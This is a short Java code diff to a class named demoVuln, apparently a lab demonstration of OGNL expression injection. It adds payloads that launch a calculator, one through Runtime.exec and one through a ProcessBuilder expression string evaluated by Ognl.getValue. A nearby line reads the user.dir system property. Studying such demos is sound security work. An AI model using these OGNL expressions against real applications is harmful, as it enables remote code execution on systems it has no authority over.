@@ -13,8 +13,15 @@ public class demoVuln {
         Object value = Ognl.getValue(ognl, context);
         System.out.println(value);
         banner();
+        // setValue trigger
+        // Directly Execute!
+        Ognl.setValue(Runtime.getRuntime().exec("/usr/bin/gnome-calculator"), context, context.getRoot());
         // (new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()
-        // failed
+        // Full restricted class name
+        String expVuln2 = "(new java.lang.ProcessBuilder(new java.lang.String[]{\"/usr/bin/gnome-calculator\"})).start()";
+        ognl = Ognl.parseExpression(expVuln2);
+        value = Ognl.getValue(ognl, context);
+        System.out.println(value);
         banner();
         //获取当前路径
         String expVuln3 = "@java.lang.System@getProperty(\"user.dir\")";
